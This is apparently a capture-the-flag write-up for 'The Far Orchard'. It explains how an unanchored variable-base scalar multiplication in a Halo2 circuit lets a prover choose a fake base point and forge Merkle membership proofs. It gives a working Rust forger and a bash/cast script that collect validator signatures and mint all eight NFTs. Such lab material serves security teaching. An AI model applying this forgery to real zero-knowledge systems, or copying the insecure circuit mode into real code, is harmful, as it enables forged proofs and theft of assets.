# The Far Orchard

8<sup>th</sup> July 2026

Prepared By: `Axlnich`

Challenge Author(s): `Axlnich`

Difficulty: Hard

<br>

# Synopsis

In this challenge, you must exploit an unanchored variable-base scalar multiplication bug in `halo2_gadgets` to forge valid zero-knowledge vow proofs for all eight entries in a Merkle tree. The circuit witnesses a base point `g_d` as a `NonIdentityPoint`, but uses the insecure Halo2 ECC chip mode where the variable-base multiplication base is not anchored to the intended generator. A prover can choose a fake base `B' = [sk_attacker^-1] * pk_target`, making `[sk_attacker] * B'` equal the public key committed in a target Merkle leaf. Each forged proof produces a fresh nullifier, the backend validator returns an EIP-712 honor signature, and `FarOrchard.honorSeal` mints one `Goldleaf Far-Seal` ERC-721 directly to `msg.sender`. The challenge is solved once all eight Seal IDs have been honored and `Setup.isSolved()` returns `true` (i.e., `honoredBitmap == 0xff` and `honoredCount == 8`).


## Description

Hard: The Far Orchard

Caldrin follows the gold-flecked trail to the Far Orchard, where Orchard Wardens judge Far-Seals before Crownspire accepts them. The same pale wax, gold flecks, and unusual approvals appear across routes tied to Damas’s trade network. Verrin is only the carrier; the real danger is a system that can choose which empty vows become official.
Eight Far-Seals are about to be honored. If they pass, Damas’s network gains authority no clerk can easily challenge. Prove the rite is broken: wear every approved face, claim all eight seals, and force the Orchard’s judgment to collapse in public.

## Skills Required

- Rust and Halo2 circuit analysis
- Elliptic-curve scalar multiplication over the Pallas/Vesta cycle
- Understanding variable-base vs. fixed-base ECC constraints
- Sinsemilla Merkle path verification
- Zero-knowledge proof generation and verification flow
- EIP-712 typed-data signatures and Solidity signature recovery
- ERC-721 minting and ownership checks
- Foundry / `cast` usage for private Anvil instances
- Exploit scripting against an HTTP API plus on-chain mint flow

## Skills Learned

- Identifying unconstrained witness choices inside a ZK circuit
- Recognizing why a point being on-curve is not the same as being the intended base
- Forging membership proofs by algebraically selecting a fake base point
- Producing unique nullifiers to bypass duplicate-nullifier protection while targeting different leaves
- Connecting off-chain ZK proof validation to on-chain EIP-712 authorization
- Auditing whether public inputs actually bind every security-relevant request field
- Using `Setup.isSolved()` as an on-chain termination oracle


# Enumeration

## Analyzing the Source Code

When unzipping the challenge, the relevant player-facing source code is split between the Rust validator/circuit and the Solidity setup contracts. The Rust code in `src/` defines the `FarOrchardCircuit`, Merkle helpers, and validator logic. The Solidity code in `setup/src/` defines `Setup` and `FarOrchard`. The win condition is NFT-based: `Setup.isSolved()` returns `true` when all eight Far-Seal bits are set and the honored counter reaches 8. Below is a detailed breakdown of each component and the single ZK constraint bug that makes every Far-Seal honor authorization forgeable.

---

### `Setup.sol`

**Purpose.** Deploys the Far Orchard ERC-721 registry, stores the validator signer, and exposes the win condition.

**Wiring & bootstrap.**

* Stores `validatorSigner`, the EOA address authorized to sign honor receipts.
* Deploys `FarOrchard` without seeding value.
* Passes the validator signer into the Orchard constructor.
* Exposes `orchard()` as a public getter so players can locate the NFT contract.
* `isSolved()` returns `true` once all eight Far-Seals have been honored.


```solidity
contract Setup {
    FarOrchard public orchard;
    address public validatorSigner;

    constructor(address _validatorSigner) {
        validatorSigner = _validatorSigner;
        orchard = new FarOrchard(_validatorSigner);
    }

    function isSolved() external view returns (bool) {
        uint256 totalSeals = orchard.TOTAL_SEALS();
        uint256 completeBitmap = (uint256(1) << totalSeals) - 1;
        return
            orchard.honoredCount() == totalSeals &&
            orchard.honoredBitmap() == completeBitmap;
    }
}
```

---

### `FarOrchard.sol`

**Purpose.** Implements the `Goldleaf Far-Seals` ERC-721 collection and mints one token only when the off-chain validator signs an EIP-712 honor receipt.

**Key design.**

* `validatorSigner` is immutable and set by `Setup`.
* `TOTAL_SEALS` is fixed at 8.
* `honoredBitmap` tracks which Seal IDs have already been honored.
* `honoredCount` tracks total honored seals.
* `nullifierUsed[nullifier]` prevents reusing the same proof nullifier twice.
* `honorSeal(sealId, nullifier, signature)` requires the EIP-712 signer to equal `validatorSigner`.
* `_safeMint(msg.sender, sealId)` mints the NFT directly to the caller; no recipient parameter exists.

**Honor path.**

```solidity
function honorSeal(
    uint256 sealId,
    bytes32 nullifier,
    bytes calldata signature
) external {
    require(sealId < TOTAL_SEALS, "Invalid Far-Seal ID");

    uint256 sealBit = uint256(1) << sealId;
    require((honoredBitmap & sealBit) == 0, "Far-Seal already honored");
    require(!nullifierUsed[nullifier], "Nullifier already used");

    bytes32 structHash = keccak256(
        abi.encode(
            keccak256(
                "Honor(address claimant,uint256 sealId,bytes32 nullifier)"
            ),
            msg.sender,
            sealId,
            nullifier
        )
    );
    address signer = _hashTypedDataV4(structHash).recover(signature);
    require(signer == validatorSigner, "Invalid validator signature");

    nullifierUsed[nullifier] = true;
    honoredBitmap |= sealBit;
    honoredCount += 1;

    _safeMint(msg.sender, sealId);
}
```

**Important implication.** The Orchard trusts the backend signature and does not independently inspect the ZK proof. The backend, however, now verifies the proof's public leaf x-coordinate against the canonical published orchard and derives the corresponding `sealId` server-side before signing. The on-chain contract receives only the signed `claimant`, derived `sealId`, and `nullifier`.

---

### `FarOrchardCircuit`

**Purpose.** Proves that a secret key maps to a public key contained in the Merkle tree and exposes the Merkle root, nullifier, and proved leaf x-coordinate as public inputs.

**Circuit witnesses.**

```rust
pub struct FarOrchardCircuit {
    pub sk: Value<pallas::Base>,
    pub g_d: Value<pallas::Affine>,
    pub merkle_path: Value<[pallas::Base; MERKLE_DEPTH]>,
    pub merkle_pos: Value<u32>,
}
```

**ECC chip construction.**

```rust
pub fn ecc_chip(&self) -> EccChip<FarOrchardFixedBases> {
    EccChip::construct(
        self.ecc_config.clone(),
        halo2_gadgets::ecc::chip::CircuitVersion::InsecureUnanchoredBase,
    )
}
```

**Main proof logic.**

```rust
let g_d = NonIdentityPoint::new(
    ecc_chip.clone(),
    layouter.namespace(|| "witness g_d"),
    self.g_d,
)?;

let sk_scalar = ScalarVar::from_base(
    ecc_chip.clone(),
    layouter.namespace(|| "sk as ScalarVar"),
    &sk_cell,
)?;
let (pk, _) = g_d.mul(layouter.namespace(|| "pk = [sk] * g_d"), sk_scalar)?;

let leaf = pk.extract_p().inner().clone();

let calculated_root = merkle_inputs
    .calculate_root(layouter.namespace(|| "Merkle path verification"), leaf)?;

layouter.constrain_instance(calculated_root.cell(), config.primary, 0)?;
// The nullifier-check region constrains nf_x against instance column 1.
layouter.constrain_instance(leaf.cell(), config.primary, 2)?;
```

**Vulnerability.** `g_d` is supplied by the prover as a witness and is only required to be a non-identity curve point. Because the ECC chip is constructed with `InsecureUnanchoredBase`, the multiplication does not force `g_d` to be the canonical Pallas generator. This means the prover controls the base used to derive the Merkle leaf.

---

### `merkle.rs`

**Purpose.** Implements the off-circuit Sinsemilla Merkle tree used by both the validator and solver.

**Key design.**

* Leaves are Pallas base-field elements representing public-key x-coordinates.
* The tree depth is 8.
* `merkle_crh(layer, left, right)` mirrors the on-circuit `MerkleChip::hash_layer`.
* Proof serialization stores `merkle_root`, `nullifier_x`, `leaf_pk_x`, proof length, and proof bytes.

**Public proof format.**

```rust
pub fn serialize_proof(
    proof: &[u8],
    merkle_root: &pallas::Base,
    nullifier_x: &pallas::Base,
    leaf_pk_x: &pallas::Base,
) -> String {
    let mut buf = Vec::new();
    buf.extend_from_slice(&merkle_root.to_repr());
    buf.extend_from_slice(&nullifier_x.to_repr());
    buf.extend_from_slice(&leaf_pk_x.to_repr());
    buf.extend_from_slice(&(proof.len() as u32).to_le_bytes());
    buf.extend_from_slice(proof);
    hex::encode(&buf)
}
```

---

### `main.rs`

**Purpose.** Builds the validator binary.

**Modes.**

* `--generate-tree` generates eight random secret keys, derives their public-key x-coordinates, builds the Merkle root, and prints public leaf data.
* Default mode reads `PROOF=<hex>` from stdin and verifies it against public inputs `[merkle_root, nullifier_x, leaf_pk_x]`.
* `--serve` keeps one parameter set and verifying key warm in a persistent process for backend requests, avoiding verifier-key setup on every proof.

**Validator input binding.**

```rust
let public_inputs: [[pallas::Base; 3]; 1] = [[merkle_root, nullifier_x, leaf_pk_x]];
let instances: [&[&[pallas::Base]]; 1] = [&[&public_inputs[0]]];

let mut transcript = Blake2bRead::<_, _, Challenge255<_>>::init(&proof_bytes[..]);
let result = verify_proof(&params, &vk, strategy, &instances, &mut transcript);
```

---

### `app_eth.py`

**Purpose.** Server-side orchestration for private-chain deployment, Merkle data, proof verification, and EIP-712 honor signing.

**Key endpoints.**

* `POST /api/launch` — starts an Anvil instance and deploys `Setup`.
* `GET /api/info` — returns Merkle root, eight leaves, Seal IDs, setup address, Orchard address, and validator signer.
* `POST /api/verify` — verifies the submitted ZK proof, requires its root and leaf to match the canonical orchard, derives the leaf's Seal ID, and signs an honor receipt for the player.
* `GET /api/flag` — returns the flag after `Setup.isSolved()` is true.

**Honor signing.**

```python
sig = sign_honor(
    player_addr,
    seal_id,
    vf_nullifier,
    orchard_addr,
    web3.eth.chain_id,
    VALIDATOR_SIGNER_PRIVKEY,
)
```

**Important implication.** The backend requires the proof root to equal the canonical orchard root and requires `leaf_pk_x` to match exactly one published orchard leaf. It derives the corresponding `seal_id`; a client-supplied `seal_id`, when present, is only checked for equality. Players still need eight distinct forged proofs/nullifiers, one for each published leaf, to obtain all eight signatures.

---

### Summary

* **NFT contract:** `FarOrchard` mints `Goldleaf Far-Seals` only with validator signatures.
* **Win condition:** `Setup.isSolved()` checks `honoredBitmap == 0xff` and `honoredCount == 8`.
* **Public data:** `/api/info` returns the Merkle root, eight leaves, and Seal IDs `0..7`.
* **Proof public inputs:** Merkle root, nullifier x-coordinate, and proved leaf x-coordinate.
* **Duplicate defense:** Nullifiers cannot be reused, but fresh attacker secret keys produce fresh nullifiers.
* **Broken invariant:** The circuit intends `pk = [sk] * G`, where `G` is the Pallas generator. In practice, the prover controls `g_d`, so the proof can satisfy `pk = [sk_attacker] * B'` for an arbitrary target Merkle leaf.
* **Trust boundary:** The signed `seal_id` is derived by the backend from the proven canonical leaf; the circuit exposes that leaf as a public input.


# Solution

## Finding the Vulnerability

**In `FarOrchardCircuit` (unanchored base):**

The circuit receives `g_d` as a witness:

```rust
pub g_d: Value<pallas::Affine>,
```

and then turns it into a `NonIdentityPoint`:

```rust
let g_d = NonIdentityPoint::new(
    ecc_chip.clone(),
    layouter.namespace(|| "witness g_d"),
    self.g_d,
)?;
```

This proves the point is usable as a curve point, but it does not prove that the point equals the Pallas generator.

---

**The insecure ECC chip mode:**

The circuit explicitly constructs the ECC chip with:

```rust
halo2_gadgets::ecc::chip::CircuitVersion::InsecureUnanchoredBase
```

The vulnerable variable-base multiplication assigns the base coordinates as prover-chosen advice instead of anchoring them to the intended base with equality constraints. As a result, the multiplication gate can be satisfied for a maliciously chosen base.

---

**The algebraic forgery:**

For any target leaf public key `pk_target`, choose a random nonzero attacker secret key `sk_attacker`, then compute:

```text
B' = [sk_attacker^-1] * pk_target
```

Inside the circuit:

```text
[sk_attacker] * B' = [sk_attacker] * [sk_attacker^-1] * pk_target = pk_target
```

The proof now opens a Merkle leaf whose original secret key is unknown.

---

**In the nullifier logic:**

The nullifier is derived from the attacker's secret key through fixed-base multiplication:

```rust
let nullifier_base = FixedPointBaseField::from_inner(ecc_chip, FarOrchardBaseField);
nullifier_base.mul(
    layouter.namespace(|| "nullifier = [sk] * NullifierK"),
    sk_cell.clone(),
)?
```

Because each forged proof uses a fresh random `sk_attacker`, each proof also has a fresh nullifier. This satisfies the on-chain `nullifierUsed` check while still targeting all eight published Merkle leaves.

---

**In `FarOrchard.honorSeal` (signature trust boundary):**

The Orchard verifies that the backend signed `(claimant, sealId, nullifier)`:

```solidity
keccak256("Honor(address claimant,uint256 sealId,bytes32 nullifier)")
```

Once the backend signs, the Solidity contract does not re-run the ZK proof or inspect the Merkle path. The backend verifies that the proof exposes a canonical leaf and derives the associated `seal_id` before it signs, so a valid proof cannot be reassigned to a different token ID by the client.

---

### The Exploit Flow

1. Fetch `/api/info` to obtain the Merkle root and all eight public-key x-coordinates.
2. Build the local Merkle tree from the published leaves.
3. For each leaf, generate a random nonzero `sk_attacker`.
4. Decompress the leaf's `pk_x` into a Pallas point `pk_target`.
5. Compute the fake base `B' = [sk_attacker^-1] * pk_target`.
6. Build a `FarOrchardCircuit` witness using:
   - `sk = sk_attacker`
   - `g_d = B'`
   - the Merkle path for the target leaf
   - the Merkle position for the target leaf
7. Generate a Halo2 proof with public inputs `[merkle_root, attacker_nullifier, pk_target_x]`.
8. Submit the proof to `/api/verify`; the backend derives the matching `seal_id` from `pk_target_x`.
9. Receive the EIP-712 honor signature from the backend.
10. Call `FarOrchard.honorSeal(sealId, nullifier, signature)`.
11. Repeat for all eight Seal IDs.
12. `Setup.isSolved()` returns `true`: every bit in `honoredBitmap` is set and `honoredCount == 8`.

---

## Exploitation

The exploit is delivered in two files: `solver/src/main.rs` (the off-chain proof forger) and `solve.sh` (the orchestrator that submits proofs and honors Far-Seals on-chain).

---

### `solver/src/main.rs` — Off-chain proof forger

```rust
let sk_attacker = random_field_element(&mut rng);

let pk_target_affine = decompress_pallas_point(leaf.pk_x);
let pk_target_point = pallas::Point::from(pk_target_affine);

let attacker_scalar = pallas::Scalar::from_repr(sk_attacker.to_repr()).unwrap();
let attacker_inv = attacker_scalar.invert().unwrap();
let b_prime_point = pk_target_point * attacker_inv;
let b_prime_affine = b_prime_point.to_affine();

let exploit_circuit = FarOrchardCircuit {
    sk: Value::known(sk_attacker),
    g_d: Value::known(b_prime_affine),
    merkle_path: Value::known(target_path.try_into().unwrap()),
    merkle_pos: Value::known(leaf.index as u32),
};
```

**Line-by-line breakdown.**

* `random_field_element(&mut rng)` — creates a fresh nonzero secret key for this forged proof.

* `decompress_pallas_point(leaf.pk_x)` — reconstructs a Pallas point from the public leaf x-coordinate.

* `attacker_scalar.invert()` — computes the scalar inverse needed to cancel the attacker's secret key.

* `b_prime_point = pk_target_point * attacker_inv` — constructs the malicious base point that makes `[sk_attacker] * B' == pk_target`.

* `g_d: Value::known(b_prime_affine)` — injects the malicious base into the circuit witness.

* `merkle_path` and `merkle_pos` — prove membership for the selected target leaf.

---

### `solve.sh` — Off-chain orchestrator

```bash
TREE_DATA=$(curl -s "$SERVER_URL/api/info")

SOLVER_INPUT=$(echo "$TREE_DATA" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f\"MERKLE_ROOT={d['merkle_root']}\")
for leaf in d['merkle_leaves']:
    print(f\"LEAF={leaf['index']},{leaf['pk_x']},{leaf['seal_id']}\")
")

echo "$SOLVER_INPUT" | "$SOLVER_BIN" 2>&1 | tee "$SOLVER_STDOUT" >&2
```

The shell script handles everything outside proof construction: fetching Merkle data, running the Rust solver, submitting proofs to `/api/verify`, redeeming returned signatures with `cast send`, and checking `/api/flag`.

#### 1) Fetch the Merkle tree

```bash
curl -s "$SERVER_URL/api/info"
```

The response contains `merkle_root`, `merkle_leaves`, `total_seals`, `setup_address`, `orchard_address`, and `validator_signer`.

#### 2) Generate forged proofs

```bash
echo "$SOLVER_INPUT" | "$SOLVER_BIN"
```

The solver prints one proof bundle per leaf:

```text
PROOF=<serialized_proof>
NULLIFIER=<nullifier>
SEAL_ID=<seal_id>
LEAF_INDEX=<index>
```

#### 3) Verify each proof with the backend

```bash
curl -s -X POST "$SERVER_URL/api/verify?uuid=$INSTANCE_UUID" \
  -H "Content-Type: application/json" \
  -d @verify_body.json
```

The backend returns:

```json
{
  "status": "ok",
  "signature": "...",
  "orchard": "...",
  "seal_id": 0,
  "claimant": "...",
  "nullifier": "..."
}
```

#### 4) Honor on-chain

```bash
cast send "$ORCHARD" "honorSeal(uint256,bytes32,bytes)" \
  "$SEAL_ID" "$NULLIFIER" "$SIG" \
  --rpc-url "$RPC_URL" \
  --private-key "$PLAYER_PRIVKEY"
```

#### 5) Verify

```bash
cast call "$ORCHARD" "honoredBitmap()(uint256)" --rpc-url "$RPC_URL"
cast call "$ORCHARD" "honoredCount()(uint256)" --rpc-url "$RPC_URL"
cast call "$SETUP_CONTRACT" "isSolved()(bool)" --rpc-url "$RPC_URL"
```

---

### Running the solver

```bash
cd htb
# open the .env file
# fill SERVER_URL, INSTANCE_UUID, RPC_URL, SETUP_CONTRACT, PLAYER_WALLET, PLAYER_PRIVKEY that you can get it on the instance
./solve.sh
```

All values are returned by the `/api/launch` endpoint when you deploy a challenge instance.

---

### Getting the flag

After all eight Far-Seals are honored and `isSolved()` returns `true`:

* Click the **Claim Flag** button on the challenge instance page, **or**
* Fetch it directly:

```bash
curl http://<host>:<port>/api/flag?uuid=<uuid>
```

**Flag:** Returned only by the instance after the solve condition is met.

---

## References

- Local vulnerable circuit: `src/circuit.rs`
- Local solver implementation: `htb/solver/src/main.rs`
- Local contracts: `setup/src/Setup.sol`, `setup/src/FarOrchard.sol`
- Bug class: unanchored variable-base scalar multiplication in `halo2_gadgets` ECC chip
- https://github.com/zcash/halo2/releases/tag/halo2_gadgets-0.5.0 (for the patched documentation from the developer)
- https://github.com/zcash/zcash/releases/tag/v6.20.0 (for the patched documentation from the developer)
